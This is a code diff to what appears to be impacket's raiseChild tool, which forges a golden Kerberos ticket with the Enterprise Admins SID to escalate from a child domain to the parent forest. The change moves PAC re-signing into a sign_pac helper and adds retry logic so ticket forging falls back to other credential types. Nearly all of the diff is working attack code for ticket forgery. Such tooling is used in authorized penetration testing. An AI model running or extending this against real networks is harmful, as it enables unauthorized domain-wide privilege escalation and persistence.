@@ -86,7 +86,7 @@ from impacket.krb5.types import Principal, KerberosTime
 from impacket.krb5 import constants
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, KerberosError
 from impacket.krb5.asn1 import AS_REP, AuthorizationData, AD_IF_RELEVANT, EncTicketPart
-from impacket.krb5.crypto import Key, _enctype_table, _checksum_table, Enctype
+from impacket.krb5.crypto import Key, _enctype_table
 from impacket.dcerpc.v5.ndr import NDRULONG
 from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
 from pyasn1.codec.der import decoder, encoder
@@ -99,9 +99,8 @@ from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_
 from impacket.dcerpc.v5.nrpc import MSRPC_UUID_NRPC, hDsrGetDcNameEx
 from impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, POLICY_LOOKUP_NAMES, LSAP_LOOKUP_LEVEL, hLsarLookupSids
 from impacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS, hLsarOpenPolicy2
-from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
-    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, \
-    PAC_PRIVSVR_CHECKSUM, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, VALIDATION_INFO
+from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
+    PAC_CLIENT_INFO_TYPE, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, VALIDATION_INFO, sign_pac
 from impacket.dcerpc.v5 import transport, drsuapi, epm, samr
 from impacket.smbconnection import SessionError
 from impacket.nt_errors import STATUS_NO_LOGON_SERVERS
@@ -134,6 +133,9 @@ RemComSTDIN          = "RemCom_stdin"
 RemComSTDERR         = "RemCom_stderr"
 
 lock = Lock()
+
+class RetryableGoldenTicketError(Exception):
+    pass
 
 class PSEXEC:
     def __init__(self, command, username, domain, smbConnection, TGS, copyFile):
@@ -895,7 +897,7 @@ class RAISECHILD:
         elif cipher.enctype == constants.EncryptionTypes.rc4_hmac.value:
             key = Key(cipher.enctype, unhexlify(ntHash))
         else:
-            raise Exception('Unsupported enctype 0x%x' % cipher.enctype)
+            raise RetryableGoldenTicketError('Unsupported enctype 0x%x' % cipher.enctype)
 
         # Key Usage 2
         # AS-REP Ticket and TGS-REP Ticket (includes TGS session
@@ -981,106 +983,14 @@ class RAISECHILD:
         else:
             raise Exception('PAC_LOGON_INFO not found! Aborting')
 
-        # Let's now clear the checksums
-        if PAC_SERVER_CHECKSUM in pacInfos:
-            serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
-            serverChecksum['Signature'] = b'\x00' * len(bytes(serverChecksum['Signature']))
-        else:
-            raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')
-
-        if PAC_PRIVSVR_CHECKSUM in pacInfos:
-            privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
-            privSvrChecksum['Signature'] = b'\x00' * len(bytes(privSvrChecksum['Signature']))
-        else:
-            raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')
-
-        if PAC_CLIENT_INFO_TYPE in pacInfos:
-            pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]
-            pacClientInfoAlignment = b'\x00' * (((len(pacClientInfoBlob) + 7) // 8 * 8) - len(pacClientInfoBlob))
-        else:
+        if PAC_CLIENT_INFO_TYPE not in pacInfos:
             raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')
 
 
-        # We changed everything we needed to make us special. Now let's repack and calculate checksums
-        # Update modified buffers in pacInfos
+        # We changed everything we needed to make us special. Now let's repack
+        # and calculate checksums through the shared PAC helper.
         pacInfos[PAC_LOGON_INFO] = validationInfoBlob
-        pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()
-        pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()
-
-        # Rebuild PAC preserving ALL original buffers in original order
-        def align8(data): return b'\x00' * (((len(data) + 7) // 8 * 8) - len(data))
-
-        # Recalculate offsets: header = 8 + num_buffers * sizeof(PAC_INFO_BUFFER)
-        numBuffers = len(pacInfos)
-        offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * numBuffers
-
-        infoBuffers = b''
-        dataBlobs = b''
-        for ulType, data in pacInfos.items():
-            ib = PAC_INFO_BUFFER()
-            ib['ulType'] = ulType
-            ib['cbBufferSize'] = len(data)
-            ib['Offset'] = offsetData
-            infoBuffers += ib.getData()
-            padding = align8(data)
-            dataBlobs += data + padding
-            offsetData = (offsetData + len(data) + 7) // 8 * 8
-
-        pacType = PACTYPE()
-        pacType['cBuffers'] = numBuffers
-        pacType['Version'] = 0
-        pacType['Buffers'] = infoBuffers + dataBlobs
-
-        blobToChecksum = pacType.getData()
-
-        # If you want to do MD5, ucomment this
-        checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
-        sigLen = len(bytes(serverChecksum['Signature']))
-        if sigLen == 12 and aesKey:
-            keyServer = Key(Enctype.AES256, unhexlify(aesKey))
-            serverChecksum['SignatureType'] = constants.ChecksumTypes.hmac_sha1_96_aes256.value
-            checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
-        elif serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
-            keyServer = Key(Enctype.AES256, unhexlify(aesKey))
-        elif serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_md5.value:
-            keyServer = Key(Enctype.RC4, unhexlify(ntHash))
-        else:
-            raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])
-
-        checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]
-        privSigLen = len(bytes(privSvrChecksum['Signature']))
-        if privSigLen == 12 and aesKey:
-            keyPriv = Key(Enctype.AES256, unhexlify(aesKey))
-            privSvrChecksum['SignatureType'] = constants.ChecksumTypes.hmac_sha1_96_aes256.value
-            checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]
-        elif privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
-            keyPriv = Key(Enctype.AES256, unhexlify(aesKey))
-        elif privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_md5.value:
-            keyPriv = Key(Enctype.RC4, unhexlify(ntHash))
-        else:
-            raise Exception('Invalid Priv checksum type 0x%x' % privSvrChecksum['SignatureType'])
-
-        serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, 17, blobToChecksum)
-        privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, 17, serverChecksum['Signature'])
-
-        # Update checksums in pacInfos and rebuild final PAC
-        pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()
-        pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()
-
-        offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * numBuffers
-        infoBuffers = b''
-        dataBlobs = b''
-        for ulType, data in pacInfos.items():
-            ib = PAC_INFO_BUFFER()
-            ib['ulType'] = ulType
-            ib['cbBufferSize'] = len(data)
-            ib['Offset'] = offsetData
-            infoBuffers += ib.getData()
-            padding = align8(data)
-            dataBlobs += data + padding
-            offsetData = (offsetData + len(data) + 7) // 8 * 8
-
-        pacType['Buffers'] = infoBuffers + dataBlobs
+        pacType = sign_pac(pacInfos, aes_key=aesKey, nt_hash=ntHash, infer_aes_signature_type=True)
 
         authorizationData = AuthorizationData()
         authorizationData[0] = noValue
@@ -1098,7 +1008,7 @@ class RAISECHILD:
         elif cipher.enctype == constants.EncryptionTypes.rc4_hmac.value:
             key = Key(cipher.enctype, unhexlify(ntHash))
         else:
-            raise Exception('Unsupported enctype 0x%x' % cipher.enctype)
+            raise RetryableGoldenTicketError('Unsupported enctype 0x%x' % cipher.enctype)
 
         # Key Usage 2
         # AS-REP Ticket and TGS-REP Ticket (includes TGS session
@@ -1181,9 +1091,13 @@ class RAISECHILD:
                     continue
                 else:
                     raise
-            goldenTicket, goldenCipher, goldenSessionKey = self.makeGolden(tgt, cipher, sessionKey,
-                                                                           credentials['nthash'], credentials['aesKey'],
-                                                                           entepriseSid + '-519')
+            try:
+                goldenTicket, goldenCipher, goldenSessionKey = self.makeGolden(tgt, cipher, sessionKey,
+                                                                               credentials['nthash'], credentials['aesKey'],
+                                                                               entepriseSid + '-519')
+            except RetryableGoldenTicketError as e:
+                logging.warning('%s failed while building golden ticket (%s), trying next method' % (credType, e))
+                continue
             TGT['KDC_REP'] = goldenTicket
             TGT['cipher'] = goldenCipher
             TGT['oldSessionKey'] = oldSessionKey
